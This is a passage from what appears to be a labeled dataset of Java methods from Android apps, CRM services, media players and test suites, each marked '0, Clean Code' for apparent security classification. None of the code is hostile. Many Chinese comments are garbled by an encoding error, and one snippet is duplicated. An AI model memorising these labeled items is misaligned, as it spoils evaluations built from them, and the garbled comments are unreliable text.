  if (oneArray == null) {
    logE(TAG,""oneArray is null, mArray: "" + mArray + "" jsonToBean: ""+ jsonToBean);
    return mArray;
  }
  boolean needAdd=false;
  boolean needHw=false;
  int run=-1;
  for (int i=0; i < mArray.size(); i++) {
    run++;
    needAdd=true;
    if (oneArray.equals(getContent(mArray,i))) {
      needHw=true;
      needAdd=false;
      break;
    }
  }
  if (needHw) {
    mArray.add(0,mArray.get(run));
    mArray.remove(run + 1);
  }
  if (needAdd)   mArray.add(0,jsonToBean.get(0));
  return mArray;
}",0,Clean Code
"/** 
 * 鍚堝苟璺緞
 */
public static String join(String... paths){
  StringBuilder sb=new StringBuilder();
  for (  String path : paths) {
    String left=sb.toString();
    boolean leftHas=left.endsWith(""/"") || left.endsWith(""\\"");
    boolean rightHas=path.startsWith(""/"") || path.startsWith(""\\"");
    if (leftHas && rightHas) {
      sb.append(path.substring(1));
    }
 else     if (!left.isEmpty() && !leftHas && !rightHas) {
      sb.append(""/"").append(path);
    }
 else {
      sb.append(path);
    }
  }
  return sb.toString();
}",0,Clean Code
"private void checkGroupEmojiPackHint(){
  if (groupEmojiPackHint == null && ChatObject.isMegagroup(currentChat)) {
    final TLRPC.ChatFull chatFull=getMessagesController().getChatFull(currentChat.id);
    if (chatFull == null || chatFull.emojiset == null || chatActivityEnterView == null || getContext() == null) {
      return;
    }
    if (MessagesController.getGlobalMainSettings().getBoolean(""groupEmojiPackHintShown"",false)) {
      return;
    }
    TLRPC.StickerSet emojiSet=chatFull.emojiset;
    long thumbDocumentId=emojiSet.thumb_document_id;
    if (thumbDocumentId == 0) {
      TLRPC.TL_messages_stickerSet stickerSet=getMediaDataController().getGroupStickerSetById(emojiSet);
      if (stickerSet != null && !stickerSet.documents.isEmpty()) {
        thumbDocumentId=stickerSet.documents.get(0).id;
      }
    }
    if (thumbDocumentId == 0) {
      return;
    }
    MessagesController.getGlobalMainSettings().edit().putBoolean(""groupEmojiPackHintShown"",true).apply();
    groupEmojiPackHint=new HintView2(getContext(),HintView2.DIRECTION_BOTTOM);
    groupEmojiPackHint.setCloseButton(true);
    groupEmojiPackHint.setMultilineText(true);
    groupEmojiPackHint.setTextAlign(Layout.Alignment.ALIGN_CENTER);
    groupEmojiPackHint.setRounding(12);
    SpannableStringBuilder packFullName=new SpannableStringBuilder(""d"");
    packFullName.setSpan(new AnimatedEmojiSpan(thumbDocumentId,groupEmojiPackHint.getTextPaint().getFontMetricsInt()),0,packFullName.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    SpannableStringBuilder titleBuilder=new SpannableStringBuilder(chatFull.emojiset.title);
    titleBuilder.setSpan(new TypefaceSpan(AndroidUtilities.getTypeface(AndroidUtilities.TYPEFACE_ROBOTO_MEDIUM)),0,titleBuilder.length(),Spanned.SPAN_EXCLUSIVE_INCLUSIVE);
    packFullName.append("" "");
    packFullName.append(titleBuilder);
    groupEmojiPackHint.setText(AndroidUtilities.replaceCharSequence(""%s"",LocaleController.getString(R.string.GroupEmojiPackHint),packFullName));
    groupEmojiPackHint.setMaxWidthPx(HintView2.cutInFancyHalf(groupEmojiPackHint.getText(),groupEmojiPackHint.getTextPaint()));
    groupEmojiPackHint.setDuration(-1);
    groupEmojiPackHint.setPadding(dp(6),0,dp(6),0);
    AndroidUtilities.runOnUIThread(() -> {
      FrameLayout.LayoutParams lp=LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT,Gravity.BOTTOM | Gravity.FILL_HORIZONTAL,0,0,0,0);
      lp.bottomMargin=chatActivityEnterView.getMeasuredHeight();
      contentView.addView(groupEmojiPackHint,lp);
      groupEmojiPackHint.setJointPx(0,chatActivityEnterView.getEmojiButton().getX() + dp(18));
      groupEmojiPackHint.show();
    }
,300);
  }
}",0,Clean Code
"private String getChallenge11Value(){
  if (!ctfEnabled) {
    return getGCPChallenge11Value();
  }
 else   if (!Strings.isNullOrEmpty(ctfValue) && !Strings.isNullOrEmpty(gcpDefaultValue) && !ctfValue.equals(gcpDefaultValue)) {
    return ctfValue;
  }
  log.info(""CTF enabled, skipping challenge11"");
  return ""please_use_supported_cloud_env"";
}",0,Clean Code
"/** 
 * @param foregroundColor See {@link #foregroundColor}.
 * @param backgroundColor See {@link #backgroundColor}.
 * @param windowColor See {@link #windowColor}.
 * @param edgeType See {@link #edgeType}.
 * @param edgeColor See {@link #edgeColor}.
 * @param typeface See {@link #typeface}.
 */
public CaptionStyleCompat(int foregroundColor,int backgroundColor,int windowColor,@EdgeType int edgeType,int edgeColor,Typeface typeface){
  this.foregroundColor=foregroundColor;
  this.backgroundColor=backgroundColor;
  this.windowColor=windowColor;
  this.edgeType=edgeType;
  this.edgeColor=edgeColor;
  this.typeface=typeface;
}
",0,Clean Code
"protected void addCriterion(String condition){
  if (condition == null) {
    throw new RuntimeException(""Value for condition cannot be null"");
  }
  criteria.add(new Criterion(condition));
}
protected void addCriterion(String condition,Object value,String property){
  if (value == null) {
    throw new RuntimeException(""Value for "" + property + "" cannot be null"");
  }
  criteria.add(new Criterion(condition,value));
}
protected void addCriterion(String condition,Object value1,Object value2,String property){
  if (value1 == null || value2 == null) {
    throw new RuntimeException(""Between values for "" + property + "" cannot be null"");
  }
  criteria.add(new Criterion(condition,value1,value2));
}
protected void addCriterion(String condition){
  if (condition == null) {
    throw new RuntimeException(""Value for condition cannot be null"");
  }
  criteria.add(new Criterion(condition));
}
protected void addCriterion(String condition,Object value,String property){
  if (value == null) {
    throw new RuntimeException(""Value for "" + property + "" cannot be null"");
  }
  criteria.add(new Criterion(condition,value));
}
protected void addCriterion(String condition,Object value1,Object value2,String property){
  if (value1 == null || value2 == null) {
    throw new RuntimeException(""Between values for "" + property + "" cannot be null"");
  }
  criteria.add(new Criterion(condition,value1,value2));
}",0,Clean Code
"@Issue(""https://github.com/openrewrite/rewrite/issues/1339"") @Test void templateStatementIsWithinTryWithResourcesBlock(){
  rewriteRun(spec -> spec.recipe(toRecipe(() -> new JavaVisitor<>(){
    @Override public J visitNewClass(    J.NewClass newClass,    ExecutionContext ctx){
      var md=getCursor().firstEnclosing(J.MethodDeclaration.class);
      if (md != null && md.getSimpleName().equals(""createBis"")) {
        return newClass;
      }
      if (newClass.getType() != null && TypeUtils.asFullyQualified(newClass.getType()).getFullyQualifiedName().equals(""java.io.ByteArrayInputStream"") && !newClass.getArguments().isEmpty()) {
        return JavaTemplate.builder(""createBis(#{anyArray()})"").contextSensitive().build().apply(getCursor(),newClass.getCoordinates().replace(),newClass.getArguments().get(0));
      }
      return newClass;
    }
  }
)),java(null,null));
}",0,Clean Code
"@Override public void updateInitStatus(Integer type){
  if (type.equals(ConfigType.SALARY_INIT_CONFIG1.getValue())) {
    int count=salaryGroupService.count();
    if (count == 0) {
      throw new CrmException(HrmCodeEnum.SALARY_GROUP_NOT_CONFIG);
    }
  }
  if (type.equals(ConfigType.INSURANCE_INIT_CONFIG1.getValue())) {
    int count=insuranceSchemeService.count();
    if (count == 0) {
      throw new CrmException(HrmCodeEnum.INSURANCE_NOT_CONFIG);
    }
  }
  configService.lambdaUpdate().set(HrmConfig::getValue,1).eq(HrmConfig::getType,type).update();
}",0,Clean Code
"public void loadMoreSearchMessages(){
  if (reqForumId != 0 && reqId != 0) {
    return;
  }
  if (delegate != null && delegate.getSearchForumDialogId() != 0 && !localMessagesSearchEndReached) {
    searchForumMessagesInternal(lastMessagesSearchString,lastMessagesSearchId);
  }
 else {
    searchMessagesInternal(lastMessagesSearchString,lastMessagesSearchId);
  }
}",0,Clean Code
"/** 
 * Applies a texture rotation to a  {@link TextureView}. 
 */
private static void applyTextureViewRotation(TextureView textureView,int textureViewRotation){
  float textureViewWidth=textureView.getWidth();
  float textureViewHeight=textureView.getHeight();
  if (textureViewWidth == 0 || textureViewHeight == 0 || textureViewRotation == 0) {
    textureView.setTransform(null);
  }
 else {
    Matrix transformMatrix=new Matrix();
    float pivotX=textureViewWidth / 2;
    float pivotY=textureViewHeight / 2;
    transformMatrix.postRotate(textureViewRotation,pivotX,pivotY);
    RectF originalTextureRect=new RectF(0,0,textureViewWidth,textureViewHeight);
    RectF rotatedTextureRect=new RectF();
    transformMatrix.mapRect(rotatedTextureRect,originalTextureRect);
    transformMatrix.postScale(textureViewWidth / rotatedTextureRect.width(),textureViewHeight / rotatedTextureRect.height(),pivotX,pivotY);
    textureView.setTransform(transformMatrix);
  }
}",0,Clean Code
"/** 
 * Converts the entirety of an  {@link InputStream} to a byte array.
 * @param inputStream the {@link InputStream} to be read. The input stream is not closed by thismethod.
 * @return a byte array containing all of the inputStream's bytes.
 * @throws IOException if an error occurs reading from the stream.
 */
public static byte[] toByteArray(InputStream inputStream) throws IOException {
  byte[] buffer=new byte[1024 * 4];
  ByteArrayOutputStream outputStream=new ByteArrayOutputStream();
  int bytesRead;
  while ((bytesRead=inputStream.read(buffer)) != -1) {
    outputStream.write(buffer,0,bytesRead);
  }
  return outputStream.toByteArray();
}",0,Clean Code
"@Override public void onItemClicked(Presenter.ViewHolder itemViewHolder,Object item,RowPresenter.ViewHolder rowViewHolder,Row row){
  if (item instanceof SettingsItem) {
    String password=GeneralData.instance(getContext()).getSettingsPassword();
    if (password == null) {
      ((SettingsItem)item).onClick.run();
    }
 else {
      SimpleEditDialog.show(getContext(),"""",newValue -> {
        if (password.equals(newValue)) {
          ((SettingsItem)item).onClick.run();
          return true;
        }
        return false;
      }
,getContext().getString(R.string.enter_settings_password),true);
    }
    PlaybackPresenter.instance(getContext()).forceFinish();
  }
 else {
    Toast.makeText(getContext(),item.toString(),Toast.LENGTH_SHORT).show();
  }
}
",0,Clean Code
"public static String getSelectionText(TerminalSelection selection,TerminalTextBuffer terminalTextBuffer){
  return getSelectionText(selection.getStart(),selection.getEnd(),terminalTextBuffer);
}
public static String getSelectionText(Point selectionStart,Point selectionEnd,TerminalTextBuffer terminalTextBuffer){
  Pair<Point,Point> pair=sortPoints(selectionStart,selectionEnd);
  pair.first.y=Math.max(pair.first.y,-terminalTextBuffer.getHistoryLinesCount());
  pair=sortPoints(pair.first,pair.second);
  Point top=pair.first;
  Point bottom=pair.second;
  final StringBuilder selectionText=new StringBuilder();
  for (int i=top.y; i <= bottom.y; i++) {
    TerminalLine line=terminalTextBuffer.getLine(i);
    String text=line.getText();
    if (i == top.y) {
      if (i == bottom.y) {
        selectionText.append(processForSelection(text.substring(Math.min(text.length(),top.x),Math.min(text.length(),bottom.x))));
      }
 else {
        selectionText.append(processForSelection(text.substring(Math.min(text.length(),top.x))));
      }
    }
 else     if (i == bottom.y) {
      selectionText.append(processForSelection(text.substring(0,Math.min(text.length(),bottom.x))));
    }
 else {
      selectionText.append(processForSelection(line.getText()));
    }
    if ((!line.isWrapped() && i < bottom.y) || bottom.x > text.length()) {
      selectionText.append(""\n"");
    }
  }
  return selectionText.toString();
}",0,Clean Code
"/** 
 * Displays a notification to the user.
 * @param data {@link NotificationData}
 * @see NotificationsAPI#display(NotificationData,Long)
 */
public static void display(NotificationData data){
  display(data,null);
}
/** 
 * Displays a notification to the user in a specific channel.
 * @param data {@link NotificationData}
 * @param channelId Channel to display the notification in.
 */
public static void display(NotificationData data,Long channelId){
  NoticePopup.enqueue$default(NoticePopup.INSTANCE,""InAppNotif#"" + ClockFactory.get().currentTimeMillis(),data.getTitle(),data.getSubtitle(),data.getBody(),data.getAttachmentBackground(),data.getAttachmentUrl(),data.getAttachment(),data.getStickers(),data.getIconUrl(),data.getIconResId(),data.getIconTopRight(),data.getAutoDismissPeriodSecs(),data.getValidScreens(),data.getOnClickTopRightIcon(),(data.getOnClick() == null && channelId != null ? v -> {
    ChannelSelector.getInstance().findAndSet(((View)v).getContext(),channelId);
    return Unit.a;
  }
 : data.getOnClick()),(data.getValidScreens() == null ? 4096 : 0) | (data.getOnClickTopRightIcon() == null ? 8192 : 0),null);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)88);
    output.writeUInt32NoTag(propEntityId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.propState,propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.propEntityId,propEntityId);
  }
  output.endObject();
}",0,Clean Code
"protected JSONObject richInstance(JSONObject result){
  if (!result.isEmpty()) {
    JSONObject definition=definitionService.getDefinitionById(result.getInteger(""defId""));
    CommonDefinition commonDefinition=JSONObject.toJavaObject(definition,CommonDefinition.class);
    result.put(""defName"",commonDefinition.getName());
    result.put(""appId"",commonDefinition.getAppId());
    result.put(""appName"",commonDefinition.getAppName());
    result.put(""appComponentName"",commonDefinition.getAppComponentName());
    if (commonDefinition.getCategory().equals(Constant.INCIDENT)) {
      IncidentType incidentType=definition.getObject(""incidentType"",IncidentType.class);
      result.put(""typeName"",incidentType.getName());
      result.put(""typeId"",incidentType.getId());
    }
  }
  return result;
}
",0,Clean Code
"/** 
 * Removes all elements after the specified start index
 * @return The removed elements
 */
public static <E>List<E> splice(List<E> list,int start){
  return splice(list,start,list.size() - start);
}
/** 
 * Removes the specified amount of elements after the specified start index and inserts the specified items
 * @param list The list of splice
 * @param start The start index
 * @param deleteCount The amount of items to remove
 * @param items The items to insert
 * @return The removed elements
 */
@SafeVarargs public static <E>List<E> splice(List<E> list,int start,int deleteCount,E... items){
  List<E> ret=new ArrayList<>(deleteCount);
  for (int i=0; i < deleteCount; i++)   ret.add(list.remove(start + i));
  list.addAll(start,Arrays.asList(items));
  return ret;
}",0,Clean Code
"/** 
 * 鍏ㄩ儴瀵煎嚭
 * @param response resp
 * @param search   鎼滅储瀵硅薄
 */
@Override public void exportExcel(HttpServletResponse response,CrmSearchBO search){
  List<Map<String,Object>> dataList=queryList(search,true).getList();
  List<CrmFieldSortVO> headList=crmFieldService.queryListHead(getLabel().getType());
  ExcelParseUtil.exportExcel(dataList,new ExcelParseUtil.ExcelParseService(){
    @Override public void castData(    Map<String,Object> record,    Map<String,Integer> headMap){
      for (      String fieldName : headMap.keySet()) {
        record.put(fieldName,ActionRecordUtil.parseValue(record.get(fieldName),headMap.get(fieldName),false));
      }
      record.put(""dealStatus"",Objects.equals(1,record.get(""dealStatus"")) ? ""宸叉垚浜�"" : ""鏈垚浜�"");
      record.put(""status"",Objects.equals(1,record.get(""status"")) ? ""鏈攣瀹�"" : ""宸查攣瀹�"");
    }
    @Override public String getExcelName(){
      return ""瀹㈡埛"";
    }
  }
,headList,response);
}",0,Clean Code
"@Override public void reevaluateBuffer(long positionUs){
  if (loader.isLoading() || loader.hasFatalError() || isPendingReset()) {
    return;
  }
  int currentQueueSize=mediaChunks.size();
  int preferredQueueSize=chunkSource.getPreferredQueueSize(positionUs,readOnlyMediaChunks);
  if (currentQueueSize <= preferredQueueSize) {
    return;
  }
  int newQueueSize=currentQueueSize;
  for (int i=preferredQueueSize; i < currentQueueSize; i++) {
    if (!haveReadFromMediaChunk(i)) {
      newQueueSize=i;
      break;
    }
  }
  if (newQueueSize == currentQueueSize) {
    return;
  }
  long endTimeUs=getLastMediaChunk().endTimeUs;
  BaseMediaChunk firstRemovedChunk=discardUpstreamMediaChunksFromIndex(newQueueSize);
  if (mediaChunks.isEmpty()) {
    pendingResetPositionUs=lastSeekPositionUs;
  }
  loadingFinished=false;
  eventDispatcher.upstreamDiscarded(primaryTrackType,firstRemovedChunk.startTimeUs,endTimeUs);
}
",0,Clean Code
"public static double right(int N,int M,int K){
  if (N < 1 || M < 1 || K < 1) {
    return 0;
  }
  long all=(long)Math.pow(M + 1,K);
  long kill=process(K,M,N);
  return (double)((double)kill / (double)all);
}",0,Clean Code
"public static void requestPinnedShortcut(Context context,Resources resources){
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
    return;
  }
  LOGGER.d(""requestPinnedShortcut"");
  ShortcutManager shortcutManager=context.getSystemService(ShortcutManager.class);
  boolean hasPinned=false;
  for (  ShortcutInfo shortcutInfo : shortcutManager.getPinnedShortcuts()) {
    if (SHORTCUT_ID.equals(shortcutInfo.getId())) {
      hasPinned=true;
      LOGGER.i(""Pinned shortcut exists"");
      break;
    }
  }
  if (hasPinned) {
    return;
  }
  ShortcutInfo shortcut=createShortcut(context,resources);
  if (shortcutManager.isRequestPinShortcutSupported()) {
    shortcutManager.requestPinShortcut(shortcut,null);
  }
}
",0,Clean Code
"@Override public void close(){
  BooleanScope.execute(busy,() -> {
    if (fileSystem == null) {
      return;
    }
    if (DataStorage.get().getStoreEntries().contains(getEntry().get()) && savedState != null && getCurrentPath().get() != null) {
      if (getBrowserModel() instanceof BrowserSessionModel) {
        bm.getSavedState().add(new BrowserSavedState.Entry(getEntry().get().getUuid(),getCurrentPath().get()));
      }
    }
    try {
      fileSystem.close();
    }
 catch (    IOException e) {
      ErrorEvent.fromThrowable(e).handle();
    }
    fileSystem=null;
  }
);
}
",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(AtomicBoolean created){
  Path path=getSourcePath();
  return new JavaIsoVisitor<ExecutionContext>(){
    @Override public J.CompilationUnit visitCompilationUnit(    J.CompilationUnit cu,    ExecutionContext ctx){
      if ((created.get() || Boolean.TRUE.equals(overwriteExisting)) && path.equals(cu.getSourcePath())) {
        Optional<SourceFile> sourceFile=createEmptyClass().findFirst();
        if (sourceFile.isPresent() && sourceFile.get() instanceof J.CompilationUnit) {
          J.CompilationUnit newCu=(J.CompilationUnit)sourceFile.get();
          return cu.withClasses(newCu.getClasses()).withSourcePath(path);
        }
      }
      return cu;
    }
  }
;
}
",0,Clean Code
"/** 
 * 鑾峰彇鎸囧畾鍗曚釜cluster涓竴涓仴搴风殑Instance
 * @throws Exception
 */
@Test public void selectOneHealthyInstancesCluster() throws Exception {
  String serviceName=randomDomainName();
  naming.registerInstance(serviceName,""127.0.0.1"",TEST_PORT,""c1"");
  naming.registerInstance(serviceName,""127.0.0.1"",60000,""c1"");
  naming.registerInstance(serviceName,""1.1.1.1"",TEST_PORT,""c1"");
  naming.registerInstance(serviceName,""127.0.0.1"",60001,""c1"");
  naming.registerInstance(serviceName,""127.0.0.1"",60002,""c2"");
  TimeUnit.SECONDS.sleep(2);
  Instance instance=naming.selectOneHealthyInstance(serviceName,Arrays.asList(""c1""));
  Assert.assertNotSame(""1.1.1.1"",instance.getIp());
  Assert.assertTrue(instance.getPort() != 60002);
  List<Instance> instancesGet=naming.getAllInstances(serviceName);
  for (  Instance instance1 : instancesGet) {
    if (instance1.getIp().equals(instance.getIp()) && instance1.getPort() == instance.getPort()) {
      Assert.assertTrue(instance.isHealthy());
      Assert.assertTrue(verifyInstance(instance1,instance));
      return;
    }
  }
  Assert.fail();
}",0,Clean Code
"/** 
 * Returns the writeReplace method
 */
protected static Method getWriteReplace(Class<?> cl){
  for (; cl != null; cl=cl.getSuperclass()) {
    Method[] methods=cl.getDeclaredMethods();
    for (int i=0; i < methods.length; i++) {
      Method method=methods[i];
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 0)       return method;
    }
  }
  return null;
}
/** 
 * Returns the writeReplace method
 */
protected Method getWriteReplace(Class<?> cl,Class<?> param){
  for (; cl != null; cl=cl.getSuperclass()) {
    for (    Method method : cl.getDeclaredMethods()) {
      if (method.getName().equals(""writeReplace"") && method.getParameterTypes().length == 1 && param.equals(method.getParameterTypes()[0]))       return method;
    }
  }
  return null;
}",0,Clean Code
"private long dispatch_callback(Emulator<?> emulator,DispatchAsyncCallback callback){
  RegisterContext context=emulator.getContext();
  Pointer dq=context.getPointerArg(0);
  Pointer block=context.getPointerArg(1);
  Pointer fun=block.getPointer(0x10);
  boolean is_barrier_async=context.getIntArg(2) != 0;
  DispatchAsyncCallback.Result dispatch=callback.canDispatch(emulator,dq,fun,is_barrier_async);
  if (dispatch == null) {
    dispatch=DispatchAsyncCallback.Result.skip;
  }
  if (dispatch == DispatchAsyncCallback.Result.skip && (log.isDebugEnabled() || LoggerFactory.getLogger(AbstractEmulator.class).isDebugEnabled())) {
    System.err.println(""Skip dispatch_async dq="" + dq + "", fun=""+ fun);
  }
  return dispatch.ordinal();
}",0,Clean Code
"public void resetClient(Channel channel){
  if (channel == null) {
    return;
  }
  logger.info(""reset this channel {}"",channel);
  for (  HostInfo hostInfo : clientMap.keySet()) {
    if (hostInfo == null) {
      continue;
    }
    NettyClient client=clientMap.get(hostInfo);
    if (client != null && client.getChannel() != null && client.getChannel().id().equals(channel.id())) {
      client.reconnect();
      break;
    }
  }
}
",0,Clean Code
"LocalDynamicConfig(String name,boolean failOnNotExist){
  this.failOnNotExist=failOnNotExist;
  this.name=name;
  this.listeners=new CopyOnWriteArrayList<>();
  this.config=new HashMap<>();
  this.confDir=System.getProperty(""bistoury.conf"");
  this.file=getFileByName(name);
  if (failOnNotExist && (file == null || !file.exists())) {
    throw new RuntimeException(""cannot find config file "" + name);
  }
}
",0,Clean Code
"@Override public void refreshShop(){
  HttpRequest request=HttpUtil.createRequest(Method.GET,""https://static.moutai519.com.cn/mt-backend/xhr/front/mall/resource/get"");
  JSONObject body=JSONObject.parseObject(request.execute().body());
  String shopUrl=body.getJSONObject(""data"").getJSONObject(""mtshops_pc"").getString(""url"");
  iShopMapper.truncateShop();
  redisCache.deleteObject(IMTCacheConstants.MT_SHOP_LIST);
  String s=HttpUtil.get(shopUrl);
  JSONObject jsonObject=JSONObject.parseObject(s);
  Set<String> shopIdSet=jsonObject.keySet();
  List<IShop> list=new ArrayList<>();
  for (  String iShopId : shopIdSet) {
    JSONObject shop=jsonObject.getJSONObject(iShopId);
    IShop iShop=new IShop(iShopId,shop);
    list.add(iShop);
  }
  this.saveBatch(list);
  redisCache.setCacheList(IMTCacheConstants.MT_SHOP_LIST,list);
  redisCache.expire(IMTCacheConstants.MT_SHOP_LIST,2,TimeUnit.HOURS);
}",0,Clean Code
"public static void omMessageHuya(String text,List<LiveRoomViewModel.DanmuInfo> resultList,MutableLiveData<Integer> danmuNum){
  try {
    JSONObject res=JSONObject.parseObject(text);
    if (""getMessageNotice"".equals(res.getString(""notice""))) {
      JSONObject data=JSONObject.parseObject(text).getJSONObject(""data"");
      String content=data.getString(""content"");
      Integer msgType=data.getInteger(""msgType"");
      String sendNick=data.getString(""sendNick"");
      Long senderLevel=data.getLong(""senderLevel"");
      if (msgType != 2 && (!isActive || !isBanned(content))) {
        resultList.add(new LiveRoomViewModel.DanmuInfo(sendNick,content));
        danmuNum.postValue(0);
      }
    }
  }
 catch (  Exception e) {
    System.out.println(""-------- 鏁版嵁澶勭悊寮傚父 --------"");
  }
}",0,Clean Code
"/** 
 * 鏂板鍦烘櫙
 * @param crmScene data
 */
@Override public void addScene(CrmScene crmScene){
  Long userId=UserUtil.getUserId();
  try {
    JSON.parse(crmScene.getData());
  }
 catch (  Exception e) {
    return;
  }
  crmScene.setIsHide(0).setSort(99999).setIsSystem(0).setCreateTime(DateUtil.date()).setUserId(userId);
  save(crmScene);
  if (Objects.equals(1,crmScene.getIsDefault())) {
    crmSceneDefaultService.lambdaUpdate().eq(CrmSceneDefault::getType,crmScene.getType()).eq(CrmSceneDefault::getUserId,userId).remove();
    CrmSceneDefault adminSceneDefault=new CrmSceneDefault();
    adminSceneDefault.setSceneId(crmScene.getSceneId()).setType(crmScene.getType()).setUserId(userId);
    crmSceneDefaultService.save(adminSceneDefault);
  }
}",0,Clean Code
"private void setText(String text){
  item.index=index++;
  DanmakuUtils.fillText(item,decodeXmlString(text));
  if (item.getType() == BaseDanmaku.TYPE_SPECIAL && text.startsWith(""["") && text.endsWith(""]""))   setSpecial();
}
",0,Clean Code
"@Override public void deserialize(SourceRecord record,Collector<T> out) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
));
}
@Override public void deserialize(SourceRecord record,Collector<T> out,TableChange tableSchema) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null && record != null && sourceMultipleEnable) {
      Struct value=(Struct)record.value();
      Struct source=value.getStruct(Envelope.FieldName.SOURCE);
      String dbName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
      String schemaName=source.getString(AbstractSourceInfo.SCHEMA_NAME_KEY);
      String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
      SnapshotRecord snapshotRecord=SnapshotRecord.fromSource(source);
      boolean isSnapshotRecord=(SnapshotRecord.TRUE == snapshotRecord);
      sourceMetricData.outputMetricsWithEstimate(dbName,schemaName,tableName,isSnapshotRecord,value);
    }
 else     if (sourceMetricData != null && record != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
),tableSchema);
}
",0,Clean Code
"@Override public boolean shouldOverrideUrlLoading(WebView view,String url){
  Uri uriOrig=Uri.parse(mUrl);
  Uri uriNew=Uri.parse(url);
  boolean override;
  if (isPageLoaded && (!Objects.equals(uriOrig.getHost(),uriNew.getHost()) || !Objects.equals(uriOrig.getPath(),uriNew.getPath()))) {
    override=true;
    if (WHITELISTED_SCHEMES.contains(uriNew.getScheme())) {
      onOpenUri(uriNew);
    }
  }
 else {
    override=false;
  }
  return override;
}
",0,Clean Code
"/** 
 * Returns the subtype ID that is supposed to be compatible between different version of OSes. <p> From the compatibility point of view, it is important to keep subtype id predictable and stable between different OSes. For this purpose, the calculation code in this method is carefully chosen and then fixed. Treat the following code as no more or less than a hash function. Each component to be hashed can be different from the corresponding value that is used to instantiate  {@link InputMethodSubtype} actually.For example, you don't need to update <code>compatibilityExtraValueItems</code> in this method even when we need to add some new extra values for the actual instance of {@link InputMethodSubtype}. </p>
 * @param keyboardLayoutSetName the keyboard layout set name (e.g., ""dvorak"").
 * @return a platform-version independent subtype ID.
 * @see #getPlatformVersionDependentExtraValue(Locale,String,boolean,boolean)
 */
private static int getPlatformVersionIndependentSubtypeId(final Locale locale,final String keyboardLayoutSetName){
  final ArrayList<String> compatibilityExtraValueItems=new ArrayList<>();
  compatibilityExtraValueItems.add(KEYBOARD_LAYOUT_SET + ""="" + keyboardLayoutSetName);
  compatibilityExtraValueItems.add(ASCII_CAPABLE);
  if (SubtypeLocaleUtils.isExceptionalLocale(locale)) {
    compatibilityExtraValueItems.add(UNTRANSLATABLE_STRING_IN_SUBTYPE_NAME + ""="" + SubtypeLocaleUtils.getKeyboardLayoutSetDisplayName(keyboardLayoutSetName));
  }
  compatibilityExtraValueItems.add(EMOJI_CAPABLE);
  compatibilityExtraValueItems.add(IS_ADDITIONAL_SUBTYPE);
  final String compatibilityExtraValues=TextUtils.join("","",compatibilityExtraValueItems);
  return Arrays.hashCode(new Object[]{locale,KEYBOARD_MODE,compatibilityExtraValues,false,false});
}
",0,Clean Code
"/** 
 * 鍦� Scope 涓缃� Namespace ID
 * @param namespaceId Namespace ID
 */
@JSONField(serialize=false,deserialize=false) public void setNamespaceId(String namespaceId){
  boolean found=false;
  for (  SpecComponentScope scope : scopes) {
    SpecComponentScopeRef ref=scope.getScopeRef();
    if (!""Namespace"".equals(ref.getKind())) {
      continue;
    }
    ref.setName(namespaceId);
    found=true;
  }
  if (!found) {
    scopes.add(SpecComponentScope.builder().scopeRef(SpecComponentScopeRef.builder().apiVersion(DefaultConstant.API_VERSION_V1_ALPHA2).kind(""Namespace"").name(namespaceId).build()).build());
  }
}",0,Clean Code
"/** 
 * 鏍￠獙浜ゆ槗璁㈠崟婊¤冻鍙敭璐х殑鏉′欢 <p> 1. 浜ゆ槗璁㈠崟寰呮敹璐�
 * @param userId 鐢ㄦ埛缂栧彿
 * @param id     浜ゆ槗璁㈠崟缂栧彿
 * @return 浜ゆ槗璁㈠崟
 */
private TradeOrderDO validateOrderReceivable(Long userId,Long id){
  TradeOrderDO order=tradeOrderMapper.selectByIdAndUserId(id,userId);
  if (order == null) {
    throw exception(ORDER_NOT_FOUND);
  }
  if (!TradeOrderStatusEnum.isDelivered(order.getStatus())) {
    throw exception(ORDER_RECEIVE_FAIL_STATUS_NOT_DELIVERED);
  }
  return order;
}",0,Clean Code
"/** 
 * 琛ュ厖瀹℃壒瀛楁淇℃伅
 * @param label
 * @param typeId
 * @param recordId
 * @param examineRecordSaveBO
 * @return void
 * @date 2020/12/18 13:44
 */
public void supplementFieldInfo(Integer label,Integer typeId,Integer recordId,ExamineRecordSaveBO examineRecordSaveBO){
  examineRecordSaveBO.setLabel(label);
  examineRecordSaveBO.setTypeId(typeId);
  examineRecordSaveBO.setRecordId(recordId);
  if (examineRecordSaveBO.getDataMap() != null) {
    examineRecordSaveBO.getDataMap().put(""createUserId"",UserUtil.getUserId());
  }
 else {
    Map<String,Object> entityMap=new HashMap<>(1);
    entityMap.put(""createUserId"",UserUtil.getUserId());
    examineRecordSaveBO.setDataMap(entityMap);
  }
}",0,Clean Code
"/** 
